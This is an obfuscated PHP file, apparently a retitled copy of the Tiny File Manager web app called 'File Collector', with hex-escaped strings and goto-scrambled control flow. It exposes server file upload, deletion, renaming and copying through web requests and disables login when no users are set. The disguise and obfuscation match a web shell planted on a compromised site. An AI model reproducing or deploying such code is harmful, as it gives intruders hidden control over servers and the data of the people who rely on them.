    <?php  fm_show_footer(); die; } goto n3dgl; undZV: defined("\106\x4d\137\111\103\117\x4e\126\137\x49\116\120\x55\x54\x5f\105\x4e\103") || define("\x46\115\137\x49\x43\117\116\126\x5f\111\x4e\120\x55\x54\137\105\x4e\x43", $iconv_input_encoding); goto cQ1dJ; TmRfR: function fm_set_msg($msg, $status = "\x6f\153") { $_SESSION[FM_SESSION_ID]["\x6d\x65\163\163\141\x67\145"] = $msg; $_SESSION[FM_SESSION_ID]["\163\164\x61\164\x75\163"] = $status; } goto NGvwG; b41Cs: $files = array(); goto XS8n5; GUZQk: function fm_clean_path($path) { $path = trim($path); $path = trim($path, "\134\x2f"); $path = str_replace(array("\56\56\57", "\x2e\56\134"), '', $path); $path = get_absolute_path($path); if ($path == "\x2e\56") { $path = ''; } return str_replace("\134", "\x2f", $path); } goto y_jFd; dbcGY: if (empty($auth_users)) { $use_auth = false; } goto WC_w3; Q9mZY: class FM_Config { var $data; function __construct() { global $root_path, $root_url, $CONFIG; $fm_url = $root_url . $_SERVER["\120\110\120\x5f\x53\x45\114\x46"]; $this->data = array("\x6c\x61\x6e\147" => "\x65\156", "\145\x72\x72\157\162\137\x72\x65\160\157\x72\164\151\x6e\147" => true, "\163\x68\157\x77\x5f\x68\151\144\144\145\x6e" => true); $data = false; if (strlen($CONFIG)) { $data = fm_object_to_array(json_decode($CONFIG)); } else { $msg = "\x54\151\156\x79\x20\106\151\x6c\x65\40\115\141\156\x61\147\x65\162\x3c\142\162\x3e\x45\x72\162\x6f\x72\x3a\40\x43\x61\156\156\157\164\x20\x6c\x6f\141\144\x20\x63\x6f\x6e\146\x69\x67\165\162\x61\164\x69\157\156"; if (substr($fm_url, -1) == "\57") { $fm_url = rtrim($fm_url, "\57"); $msg .= "\x3c\142\162\76"; $msg .= "\x3c\x62\162\76\x53\x65\145\155\163\x20\x6c\x69\x6b\145\x20\171\x6f\165\40\150\141\166\x65\40\x61\x20\164\162\141\x69\x6c\151\156\147\40\x73\x6c\x61\163\150\40\x6f\156\x20\164\150\145\40\125\122\x4c\x2e"; $msg .= "\x3c\x62\162\76\124\162\x79\x20\x74\x68\x69\163\40\154\x69\156\x6b\72\40\74\x61\40\150\162\145\x66\75\x22" . $fm_url . "\x22\76" . $fm_url . "\74\x2f\x61\x3e"; } die($msg); } if (is_array($data) && count($data)) { $this->data = $data; } else { $this->save(); } } function save() { global $root_path; $fm_file = $root_path . $_SERVER["\120\x48\120\137\x53\105\114\106"]; $var_name = "\44\103\117\116\106\x49\x47"; $var_value = var_export(json_encode($this->data), true); $config_string = "\x3c\77\160\150\x70" . chr(13) . chr(10) . "\57\x2f\104\x65\146\x61\x75\x6c\164\40\103\x6f\x6e\146\x69\x67\165\x72\141\x74\x69\x6f\156" . chr(13) . chr(10) . "{$var_name}\40\75\40{$var_value}\73" . chr(13) . chr(10); if (file_exists($fm_file)) { $lines = file($fm_file); if ($fh = @fopen($fm_file, "\167")) { @fputs($fh, $config_string, strlen($config_string)); for ($x = 3; $x < count($lines); $x++) { @fputs($fh, $lines[$x], strlen($lines[$x])); } @fclose($fh); } } } } goto z29n_; kMduM: $p = isset($_GET["\160"]) ? $_GET["\160"] : (isset($_POST["\x70"]) ? $_POST["\160"] : ''); goto tQDvO; MPToG: function fm_get_text_names() { return array("\154\151\143\x65\x6e\x73\145", "\162\145\141\x64\x6d\145", "\x61\x75\164\150\157\162\163", "\x63\157\156\x74\x72\x69\x62\x75\x74\x6f\x72\x73", "\x63\x68\141\156\x67\x65\x6c\x6f\147"); } goto pqqjD; WC_w3: $is_https = isset($_SERVER["\110\124\124\x50\123"]) && ($_SERVER["\110\124\x54\120\x53"] == "\157\156" || $_SERVER["\x48\124\124\120\123"] == 1) || isset($_SERVER["\x48\x54\x54\120\137\130\137\x46\117\122\127\101\x52\x44\x45\104\x5f\x50\122\117\124\117"]) && $_SERVER["\x48\x54\x54\x50\x5f\x58\x5f\106\x4f\x52\127\101\122\104\105\104\x5f\x50\x52\x4f\124\x4f"] == "\150\164\164\160\x73"; goto ImiuA; BtoPt: ?>
    </div>

</form>

<?php  goto fRikB; p4T7E: define("\106\115\137\x45\104\x49\x54\137\106\x49\114\x45", $edit_files); goto undZV; fCzyX: if (isset($_GET["\144\x65\154"]) && !FM_READONLY) { $del = str_replace("\x2f", '', fm_clean_path($_GET["\x64\x65\x6c"])); if ($del != '' && $del != "\56\x2e" && $del != "\x2e") { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } $is_dir = is_dir($path . "\x2f" . $del); if (fm_rdelete($path . "\x2f" . $del)) { $msg = $is_dir ? "\106\157\x6c\x64\x65\x72\x20\x3c\142\x3e\x25\x73\74\x2f\x62\x3e\x20\x64\x65\154\x65\164\145\144" : "\106\x69\x6c\145\x20\74\142\x3e\x25\163\x3c\57\142\x3e\40\144\x65\x6c\x65\x74\145\144"; fm_set_msg(sprintf($msg, fm_enc($del))); } else { $msg = $is_dir ? "\x46\157\154\x64\x65\x72\40\74\x62\x3e\x25\x73\74\x2f\142\76\40\156\157\x74\40\x64\145\x6c\145\164\x65\144" : "\x46\x69\x6c\x65\40\x3c\142\76\45\x73\74\57\142\x3e\x20\x6e\x6f\164\40\x64\145\154\x65\x74\x65\144"; fm_set_msg(sprintf($msg, fm_enc($del)), "\145\x72\162\x6f\162"); } } else { fm_set_msg("\127\162\x6f\156\147\40\x66\151\154\145\x20\x6f\x72\40\x66\157\154\144\x65\x72\x20\156\141\155\145", "\x65\x72\x72\157\x72"); } fm_redirect(FM_SELF_URL . "\x3f\160\x3d" . urlencode(FM_PATH)); } goto kl3rr; F8RYQ: if (isset($_GET["\x72\145\x6e"], $_GET["\164\157"]) && !FM_READONLY) { $old = $_GET["\162\145\156"]; $old = fm_clean_path($old); $old = str_replace("\x2f", '', $old); $new = $_GET["\164\x6f"]; $new = fm_clean_path($new); $new = str_replace("\57", '', $new); $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } if ($old != '' && $new != '') { if (fm_rename($path . "\57" . $old, $path . "\57" . $new)) { fm_set_msg(sprintf("\x52\x65\156\141\x6d\145\x64\x20\146\162\x6f\x6d\40\x3c\x62\76\x25\163\74\57\x62\x3e\40\164\x6f\x20\x3c\x62\76\x25\163\74\x2f\x62\76", fm_enc($old), fm_enc($new))); } else { fm_set_msg(sprintf("\105\x72\x72\x6f\162\40\167\150\x69\154\x65\x20\x72\x65\156\x61\x6d\151\156\x67\40\x66\162\x6f\155\x20\x3c\x62\76\45\163\74\x2f\x62\76\40\164\x6f\40\74\142\x3e\x25\163\x3c\x2f\x62\76", fm_enc($old), fm_enc($new)), "\x65\x72\x72\x6f\162"); } } else { fm_set_msg("\116\141\155\145\x73\40\x6e\x6f\x74\40\163\x65\164", "\x65\x72\162\157\162"); } fm_redirect(FM_SELF_URL . "\77\160\x3d" . urlencode(FM_PATH)); } goto pf37z; mxXAo: ?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php  goto TB0Md; U0WDh: $lang_list = array("\145\156" => "\x45\x6e\147\154\x69\163\x68"); goto gCzHZ; LmfeZ: function fm_get_file_icon_class($path) { $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION)); switch ($ext) { case "\x69\x63\x6f": case "\147\151\146": case "\152\160\x67": case "\152\160\x65\147": case "\152\160\143": case "\x6a\160\x32": case "\x6a\x70\170": case "\x78\x62\155": case "\167\142\155\x70": case "\x70\x6e\x67": case "\x62\155\160": case "\x74\151\x66": case "\x74\151\146\x66": case "\163\x76\147": $img = "\x66\141\40\146\141\x2d\x70\x69\x63\164\x75\162\145\x2d\157"; break; case "\x70\141\163\x73\x77\x64": case "\x66\164\160\161\165\x6f\x74\x61": case "\x73\x71\154": case "\x6a\x73": case "\152\163\x6f\156": case "\163\150": case "\x63\157\156\146\x69\x67": case "\x74\x77\151\147": case "\164\x70\x6c": case "\155\x64": case "\x67\x69\164\x69\147\x6e\x6f\162\145": case "\x63": case "\143\x70\160": case "\143\163": case "\x70\x79": case "\155\x61\160": case "\x6c\157\143\153": case "\x64\164\x64": $img = "\x66\x61\x20\x66\141\55\146\x69\154\145\x2d\143\x6f\x64\x65\x2d\157"; break; case "\x74\x78\x74": case "\151\x6e\151": case "\143\157\x6e\146": case "\x6c\x6f\x67": case "\150\x74\x61\x63\143\145\x73\163": $img = "\x66\x61\40\146\x61\x2d\146\151\154\x65\x2d\164\145\170\x74\55\157"; break; case "\x63\163\163": case "\x6c\x65\x73\x73": case "\x73\x61\163\x73": case "\x73\143\163\163": $img = "\x66\141\40\146\x61\55\x63\x73\163\x33"; break; case "\172\151\160": case "\162\141\162": case "\147\172": case "\x74\141\162": case "\x37\x7a": $img = "\146\141\40\146\x61\x2d\x66\151\x6c\145\55\141\162\x63\150\x69\166\145\x2d\157"; break; case "\x70\x68\160": case "\160\x68\x70\x34": case "\160\x68\160\x35": case "\x70\x68\x70\163": case "\160\150\x74\155\x6c": $img = "\x66\141\40\x66\141\55\143\x6f\144\x65"; break; case "\150\x74\155": case "\x68\x74\x6d\x6c": case "\x73\x68\x74\x6d\x6c": case "\x78\150\164\155\x6c": $img = "\x66\x61\x20\x66\141\x2d\x68\x74\x6d\154\x35"; break; case "\x78\x6d\154": case "\x78\163\154": $img = "\x66\x61\x20\x66\141\x2d\146\151\154\145\x2d\x65\170\143\145\154\55\157"; break; case "\x77\141\x76": case "\155\x70\63": case "\155\160\x32": case "\x6d\64\x61": case "\141\141\143": case "\157\147\147": case "\x6f\147\x61": case "\167\155\x61": case "\155\153\x61": case "\x66\x6c\141\143": case "\x61\143\63": case "\x74\x64\163": $img = "\146\141\x20\146\141\x2d\155\x75\x73\151\x63"; break; case "\155\x33\165": case "\x6d\63\165\70": case "\x70\154\163": case "\143\x75\145": $img = "\146\x61\40\x66\x61\x2d\x68\145\x61\x64\x70\150\157\156\x65\x73"; break; case "\141\166\x69": case "\155\160\x67": case "\155\160\x65\147": case "\x6d\x70\x34": case "\x6d\64\166": case "\x66\154\166": case "\146\64\x76": case "\x6f\147\155": case "\157\147\166": case "\x6d\157\166": case "\x6d\x6b\166": case "\63\147\x70": case "\141\x73\146": case "\x77\x6d\166": $img = "\x66\141\x20\x66\x61\x2d\146\x69\154\145\55\166\151\144\145\x6f\x2d\x6f"; break; case "\145\155\154": case "\155\163\147": $img = "\146\141\40\146\x61\x2d\145\x6e\166\145\154\x6f\160\x65\55\157"; break; case "\x78\x6c\163": case "\x78\154\x73\x78": $img = "\x66\141\40\146\x61\x2d\x66\x69\154\x65\x2d\x65\170\143\x65\x6c\55\x6f"; break; case "\143\163\x76": $img = "\146\x61\40\146\x61\55\146\151\x6c\x65\x2d\164\145\170\164\55\157"; break; case "\142\141\153": $img = "\x66\x61\40\x66\x61\x2d\143\x6c\151\160\x62\x6f\x61\x72\144"; break; case "\x64\157\143": case "\144\x6f\x63\170": $img = "\x66\x61\x20\146\141\x2d\x66\x69\x6c\145\55\x77\x6f\162\144\x2d\x6f"; break; case "\x70\160\164": case "\x70\x70\164\x78": $img = "\146\x61\40\x66\x61\55\x66\x69\x6c\145\55\160\x6f\x77\x65\x72\160\x6f\x69\x6e\x74\x2d\157"; break; case "\x74\x74\x66": case "\x74\164\143": case "\x6f\x74\x66": case "\x77\157\x66\146": case "\167\157\x66\x66\62": case "\x65\157\x74": case "\146\x6f\x6e": $img = "\146\141\x20\x66\x61\55\146\x6f\x6e\164"; break; case "\160\x64\146": $img = "\x66\141\x20\146\x61\55\x66\x69\x6c\145\x2d\x70\144\146\x2d\x6f"; break; case "\160\x73\144": case "\x61\151": case "\145\160\x73": case "\146\x6c\x61": case "\x73\167\146": $img = "\146\141\40\146\141\55\x66\x69\x6c\145\55\x69\155\141\x67\x65\x2d\x6f"; break; case "\x65\x78\x65": case "\x6d\163\151": $img = "\146\141\x20\146\x61\55\x66\151\x6c\x65\55\157"; break; case "\142\141\164": $img = "\x66\141\40\146\x61\x2d\x74\x65\162\x6d\x69\x6e\x61\154"; break; default: $img = "\x66\x61\x20\x66\x61\x2d\151\x6e\146\x6f\55\x63\151\162\143\154\x65"; } return $img; } goto Vfm4F; ImiuA: if (isset($_SESSION[FM_SESSION_ID]["\154\x6f\147\x67\x65\x64"]) && !empty($directories_users[$_SESSION[FM_SESSION_ID]["\x6c\x6f\147\147\145\x64"]])) { $wd = fm_clean_path(dirname($_SERVER["\x50\x48\120\x5f\123\105\114\106"])); $root_url = $root_url . $wd . DIRECTORY_SEPARATOR . $directories_users[$_SESSION[FM_SESSION_ID]["\x6c\x6f\x67\x67\145\144"]]; } goto pEIkN; XS8n5: if (is_array($objects)) { foreach ($objects as $file) { if ($file == "\x2e" || $file == "\x2e\56" && in_array($file, $GLOBALS["\145\170\143\154\165\144\145\x5f\151\164\145\x6d\163"])) { continue; } if (!FM_SHOW_HIDDEN && substr($file, 0, 1) === "\56") { continue; } $new_path = $path . "\x2f" . $file; if (@is_file($new_path) && !in_array($file, $GLOBALS["\145\x78\x63\154\x75\144\x65\x5f\151\164\145\x6d\x73"])) { $files[] = $file; } elseif (@is_dir($new_path) && $file != "\x2e" && $file != "\x2e\56" && !in_array($file, $GLOBALS["\x65\170\143\x6c\165\x64\x65\137\151\164\x65\155\163"])) { $folders[] = $file; } } } goto AKU3A; dg8ky: if (!isset($_GET["\x70"]) && empty($_FILES)) { fm_redirect(FM_SELF_URL . "\77\x70\75"); } goto kMduM; M8q67: echo lng("\x4d\157\144\x69\146\151\x65\x64"); goto hDrSW; mHCdb: function fm_show_header_login() { $sprites_ver = "\62\x30\x31\x36\x30\x33\61\65"; header("\103\157\x6e\164\x65\156\x74\x2d\x54\x79\160\x65\72\40\x74\x65\170\164\57\150\x74\x6d\x6c\x3b\x20\x63\x68\141\x72\x73\x65\164\75\x75\164\x66\x2d\70"); header("\105\170\x70\x69\162\x65\x73\72\40\x53\x61\x74\54\x20\x32\66\40\112\x75\154\40\x31\x39\x39\67\x20\60\x35\x3a\60\x30\72\60\60\40\107\x4d\x54"); header("\x43\x61\143\x68\145\55\103\x6f\156\x74\162\157\154\72\40\156\157\x2d\x73\x74\x6f\162\145\54\x20\156\157\x2d\x63\141\x63\x68\145\x2c\x20\x6d\x75\163\164\55\162\145\166\x61\154\x69\x64\x61\164\145\x2c\x20\160\x6f\x73\x74\55\x63\150\145\x63\153\x3d\x30\54\40\160\x72\x65\x2d\x63\150\x65\x63\153\x3d\60"); header("\x50\162\x61\x67\155\x61\x3a\40\x6e\157\x2d\143\x61\x63\150\145"); global $lang, $root_url, $favicon_path; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="icon" href="<?php  echo fm_enc($favicon_path); ?>
" type="image/png">
    <title><?php  echo fm_enc(APP_TITLE); ?>
</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <style>
        body.fm-login-page{background-color:#f7f9fb;font-size:14px}
        .fm-login-page .brand{width:121px;overflow:hidden;margin:0 auto;margin:40px auto;margin-bottom:0;position:relative;z-index:1}
        .fm-login-page .brand img{width:100%}
        .fm-login-page .card-wrapper{width:360px}
        .fm-login-page .card{border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{margin-bottom:1.5rem;font-size:24px;font-weight:300;letter-spacing:-.5px}
        .fm-login-page .form-control{border-width:2.3px}
        .fm-login-page .form-group label{width:100%}
        .fm-login-page .btn.btn-block{padding:12px 10px}
        .fm-login-page .footer{margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width: 425px) {
            .fm-login-page .card-wrapper{width:90%;margin:0 auto}
        }
        @media screen and (max-width: 320px) {
            .fm-login-page .card.fat{padding:0}
            .fm-login-page .card.fat .card-body{padding:15px}
        }
        .message{padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{border-color:green;color:green}
        .message.error{border-color:red;color:red}
        .message.alert{border-color:orange;color:orange}
    </style>
</head>
<body class="fm-login-page">
<div id="wrapper" class="container-fluid">

    <?php  } goto hbJVm; di8jc: ?>
        </table>
    </div>

    <div class="row">
        <?php  goto DRXTm; g_UrP: $cfg = new FM_Config(); goto guvYS; LgKTb: $num_files = count($files); goto Xlys5; Xlys5: $num_folders = count($folders); goto vyYAJ; uEynF: function fm_get_zif_info($path, $ext) { if ($ext == "\172\151\x70" && function_exists("\172\x69\x70\x5f\x6f\160\x65\156")) { $arch = zip_open($path); if ($arch) { $filenames = array(); while ($zip_entry = zip_read($arch)) { $zip_name = zip_entry_name($zip_entry); $zip_folder = substr($zip_name, -1) == "\57"; $filenames[] = array("\x6e\x61\x6d\x65" => $zip_name, "\146\x69\154\x65\x73\151\x7a\x65" => zip_entry_filesize($zip_entry), "\x63\157\x6d\160\162\145\163\163\x65\144\137\163\x69\172\145" => zip_entry_compressedsize($zip_entry), "\146\x6f\154\x64\x65\x72" => $zip_folder); } zip_close($arch); return $filenames; } } elseif ($ext == "\164\141\x72" && class_exists("\x50\150\x61\x72\104\141\x74\x61")) { $archive = new PharData($path); $filenames = array(); foreach (new RecursiveIteratorIterator($archive) as $file) { $parent_info = $file->getPathInfo(); $zip_name = str_replace("\x70\x68\x61\x72\x3a\57\x2f" . $path, '', $file->getPathName()); $zip_name = substr($zip_name, ($pos = strpos($zip_name, "\57")) !== false ? $pos + 1 : 0); $zip_folder = $parent_info->getFileName(); $zip_info = new SplFileInfo($file); $filenames[] = array("\156\x61\155\145" => $zip_name, "\x66\x69\x6c\x65\163\151\172\145" => $zip_info->getSize(), "\x63\157\x6d\x70\x72\x65\x73\163\145\144\137\x73\x69\x7a\x65" => $file->getCompressedSize(), "\146\157\154\144\x65\x72" => $zip_folder); } return $filenames; } return false; } goto Car6Q; ysOps: if (empty($folders) && empty($files)) { ?>
                <tfoot>
                    <tr><?php  if (!FM_READONLY) { ?>
                            <td></td><?php  } ?>
                        <td colspan="<?php  echo !FM_IS_WIN ? "\x36" : "\64"; ?>
"><em><?php  echo "\106\157\154\x64\x65\x72\x20\151\163\x20\x65\x6d\160\x74\171"; ?>
</em></td>
                    </tr>
                </tfoot>
                <?php  } else { ?>
                <tfoot>
                    <tr><?php  if (!FM_READONLY) { ?>
                            <td class="gray"></td><?php  } ?>
                        <td class="gray" colspan="<?php  echo !FM_IS_WIN ? "\66" : "\64"; ?>
">
                            Full size: <span title="<?php  printf("\45\x73\x20\x62\171\164\x65\x73", $all_files_size); ?>
"><?php  echo "\74\x73\x70\141\156\x20\x63\154\x61\x73\163\75\42\x62\x61\x64\147\x65\40\142\141\144\x67\x65\55\154\x69\147\x68\164\42\x3e" . fm_get_filesize($all_files_size) . "\x3c\x2f\163\x70\x61\x6e\76"; ?>
</span>
                            <?php  echo lng("\x46\x69\154\x65") . "\x3a\40\x3c\x73\160\x61\156\x20\143\x6c\x61\163\163\75\x22\142\x61\x64\147\145\x20\142\x61\x64\147\145\55\154\x69\147\150\x74\42\76" . $num_files . "\74\x2f\x73\160\x61\x6e\76"; ?>
                            <?php  echo lng("\x46\157\x6c\x64\145\x72") . "\72\40\x3c\x73\160\141\156\x20\x63\154\x61\x73\163\x3d\42\x62\x61\x64\x67\x65\40\x62\x61\x64\x67\145\x2d\x6c\x69\147\150\x74\x22\76" . $num_folders . "\x3c\57\163\160\141\x6e\76"; ?>
                            <?php  echo lng("\115\x65\155\157\x72\171\125\163\145\x64") . "\x3a\40\74\x73\x70\x61\156\x20\143\154\x61\x73\x73\75\x22\142\141\144\x67\145\40\142\141\144\147\x65\x2d\x6c\151\x67\150\x74\42\76" . fm_get_filesize(@memory_get_usage(true)) . "\x3c\57\x73\160\141\156\76"; ?>
                            <?php  echo lng("\120\141\x72\x74\x69\164\x69\x6f\x6e\123\x69\x7a\x65") . "\72\x20\74\x73\160\141\156\40\x63\154\141\163\x73\x3d\42\x62\141\144\x67\x65\x20\142\141\144\x67\x65\55\154\x69\147\150\x74\42\76" . fm_get_filesize(@disk_free_space($path)) . "\x3c\57\x73\x70\141\156\76\40\146\162\x65\145\x20\157\x66\x20\74\x73\x70\x61\x6e\x20\143\x6c\x61\x73\163\x3d\x22\x62\141\x64\x67\x65\40\x62\x61\144\147\145\55\x6c\x69\147\150\x74\42\76" . fm_get_filesize(@disk_total_space($path)) . "\x3c\57\x73\160\141\x6e\76"; ?>
                        </td>
                    </tr>
                </tfoot>
                <?php  } goto di8jc; njHdZ: $sticky_navbar = true; goto DBPas; FZRG0: if (isset($_POST["\x66\151\x6c\x65"], $_POST["\143\157\x70\x79\137\x74\x6f"], $_POST["\x66\x69\x6e\151\x73\150"]) && !FM_READONLY) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $copy_to_path = FM_ROOT_PATH; $copy_to = fm_clean_path($_POST["\143\x6f\x70\x79\137\164\x6f"]); if ($copy_to != '') { $copy_to_path .= "\x2f" . $copy_to; } if ($path == $copy_to_path) { fm_set_msg("\120\141\x74\150\x73\40\155\x75\x73\164\x20\142\x65\x20\156\x6f\x74\40\145\161\165\x61\154", "\x61\154\145\162\x74"); fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } if (!is_dir($copy_to_path)) { if (!fm_mkdir($copy_to_path, true)) { fm_set_msg("\125\x6e\141\142\154\145\x20\x74\x6f\40\x63\162\145\141\x74\145\40\x64\x65\163\164\x69\156\x61\x74\x69\x6f\x6e\40\146\157\154\x64\145\162", "\x65\x72\162\x6f\162"); fm_redirect(FM_SELF_URL . "\x3f\160\x3d" . urlencode(FM_PATH)); } } $move = isset($_POST["\155\157\166\145"]); $errors = 0; $files = $_POST["\146\x69\x6c\x65"]; if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $from = $path . "\57" . $f; $dest = $copy_to_path . "\x2f" . $f; if ($move) { $rename = fm_rename($from, $dest); if ($rename === false) { $errors++; } } else { if (!fm_rcopy($from, $dest)) { $errors++; } } } } if ($errors == 0) { $msg = $move ? "\123\x65\x6c\145\143\x74\x65\144\40\x66\x69\154\145\163\40\141\x6e\x64\x20\x66\x6f\154\x64\x65\x72\x73\x20\x6d\x6f\166\145\x64" : "\x53\145\154\x65\x63\x74\x65\x64\x20\x66\x69\154\x65\163\x20\x61\156\x64\x20\146\157\154\x64\x65\162\x73\x20\143\157\160\x69\145\x64"; fm_set_msg($msg); } else { $msg = $move ? "\x45\162\162\x6f\162\40\167\150\x69\x6c\145\40\x6d\x6f\166\x69\156\147\40\x69\164\145\155\x73" : "\105\162\x72\157\162\x20\x77\x68\151\x6c\x65\40\x63\x6f\160\171\x69\x6e\147\40\151\164\x65\155\x73"; fm_set_msg($msg, "\145\x72\x72\x6f\x72"); } } else { fm_set_msg("\116\157\164\150\151\156\x67\x20\163\x65\154\x65\143\164\145\144", "\141\154\x65\x72\164"); } fm_redirect(FM_SELF_URL . "\x3f\x70\75" . urlencode(FM_PATH)); } goto F8RYQ; Qir5i: if (isset($_POST["\147\x72\x6f\x75\160"], $_POST["\144\145\154\x65\x74\x65"]) && !FM_READONLY) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $errors = 0; $files = $_POST["\146\x69\154\x65"]; if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $new_path = $path . "\x2f" . $f; if (!fm_rdelete($new_path)) { $errors++; } } } if ($errors == 0) { fm_set_msg("\123\145\x6c\x65\x63\164\x65\144\x20\x66\x69\x6c\x65\163\x20\141\x6e\144\x20\146\x6f\154\x64\x65\x72\x20\144\x65\154\145\x74\145\x64"); } else { fm_set_msg("\x45\162\162\x6f\162\40\x77\150\x69\154\x65\40\x64\145\154\145\164\x69\x6e\x67\x20\151\164\145\x6d\163", "\x65\x72\x72\157\162"); } } else { fm_set_msg("\116\157\x74\x68\151\x6e\147\x20\x73\x65\x6c\145\143\164\x65\x64", "\141\x6c\x65\x72\164"); } fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } goto bnp0_; EWRiI: $allowed_extensions = ''; goto Dhyof; pqqjD: function fm_get_onlineViewer_exts() { return array("\x64\157\x63", "\x64\x6f\x63\x78", "\x78\x6c\163", "\170\154\163\170", "\160\x64\x66", "\x70\x70\164", "\160\x70\164\x78", "\x61\151", "\160\x73\144", "\x64\170\x66", "\170\x70\163", "\x72\141\162"); } goto Zcekm; VLH_a: fm_show_message(); goto LgKTb; Rgb2O: $GLOBALS["\x6f\156\154\151\x6e\145\x5f\x76\x69\145\x77\145\x72"] = "\x67\x6f\157\x67\x6c\145"; goto njHdZ; fRikB: fm_show_footer(); goto AKvW3; wk0vd: if (!empty($_FILES) && !FM_READONLY) { $override_file_name = false; $f = $_FILES; $path = FM_ROOT_PATH; $ds = DIRECTORY_SEPARATOR; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $errors = 0; $uploads = 0; $allowed = FM_EXTENSION ? explode("\x2c", FM_EXTENSION) : false; $filename = $f["\146\x69\154\x65"]["\156\x61\x6d\145"]; $tmp_name = $f["\x66\x69\x6c\x65"]["\x74\155\160\x5f\156\141\x6d\x65"]; $ext = pathinfo($filename, PATHINFO_EXTENSION); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; $targetPath = $path . $ds; $fullPath = $path . "\x2f" . $_REQUEST["\x66\x75\x6c\x6c\160\141\164\150"]; $folder = substr($fullPath, 0, strrpos($fullPath, "\x2f")); if (file_exists($fullPath) && !$override_file_name) { $ext_1 = $ext ? "\x2e" . $ext : ''; $fullPath = str_replace($ext_1, '', $fullPath) . "\x5f" . date("\x79\x6d\144\x48\x69\x73") . $ext_1; } if (!is_dir($folder)) { $old = umask(0); mkdir($folder, 511, true); umask($old); } if (empty($f["\x66\x69\x6c\x65"]["\x65\x72\162\157\x72"]) && !empty($tmp_name) && $tmp_name != "\156\x6f\x6e\145" && $isFileAllowed) { if (move_uploaded_file($tmp_name, $fullPath)) { die("\x53\165\143\x63\x65\x73\x73\146\165\x6c\154\171\x20\165\x70\x6c\x6f\x61\x64\x65\x64"); } else { die(sprintf("\105\x72\x72\x6f\x72\x20\x77\150\x69\154\x65\40\x75\160\154\x6f\141\x64\151\x6e\x67\x20\x66\x69\x6c\x65\x73\56\x20\x55\x70\154\x6f\141\x64\145\144\40\146\x69\x6c\x65\163\72\x20\x25\x73", $uploads)); } } die; } goto Qir5i; krXyl: if ($parent !== false) { ?>
                <tr><?php  if (!FM_READONLY) { ?>
                    <td class="nosort"></td><?php  } ?>
                    <td class="border-0"><a href="?p=<?php  echo urlencode($parent); ?>
"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0"></td>
                    <td class="border-0"></td>
                    <td class="border-0"></td>
                    <?php  if (!FM_IS_WIN) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php  } ?>
                </tr>
                <?php  } goto QP0qe; p6zdD: function fm_rcopy($path, $dest, $upd = true, $force = true) { if (is_dir($path)) { if (!fm_mkdir($dest, $force)) { return false; } $objects = scandir($path); $ok = true; if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\56\x2e") { if (!fm_rcopy($path . "\x2f" . $file, $dest . "\57" . $file)) { $ok = false; } } } } return $ok; } elseif (is_file($path)) { return fm_copy($path, $dest, $upd); } return false; } goto U2JL9; ZHfGx: class FM_Zipper_Tar { private $tar; public function __construct() { $this->tar = null; } public function create($filename, $files) { $this->tar = new PharData($filename); if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { return false; } } return true; } else { if ($this->addFileOrDir($files)) { return true; } return false; } } public function unzip($filename, $path) { $res = $this->tar->open($filename); if ($res !== true) { return false; } if ($this->tar->extractTo($path)) { return true; } return false; } private function addFileOrDir($filename) { if (is_file($filename)) { return $this->tar->addFile($filename); } elseif (is_dir($filename)) { return $this->addDir($filename); } return false; } private function addDir($path) { $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\x2e\56") { if (is_dir($path . "\57" . $file)) { if (!$this->addDir($path . "\x2f" . $file)) { return false; } } elseif (is_file($path . "\57" . $file)) { try { $this->tar->addFile($path . "\x2f" . $file); } catch (Exception $e) { return false; } } } } return true; } return false; } } goto Q9mZY; zBKs0: $iconv_input_encoding = "\125\x54\106\55\70"; goto h0PZa; l6eQi: defined("\x46\x4d\x5f\123\110\117\127\x5f\110\x49\104\104\105\116") || define("\x46\x4d\137\123\x48\117\127\137\x48\111\104\104\x45\116", $show_hidden_files); goto q8bha; Z2yVc: define("\101\120\120\137\124\111\x54\114\105", "\106\x69\x6c\x65\40\103\157\154\x6c\x65\143\164\157\x72"); goto nQ4OP; s0xM3: if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } goto iDqGR; vUu8h: echo lng("\x53\x69\172\145"); goto c1Xrh; W07sS: if (!FM_READONLY) { ?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
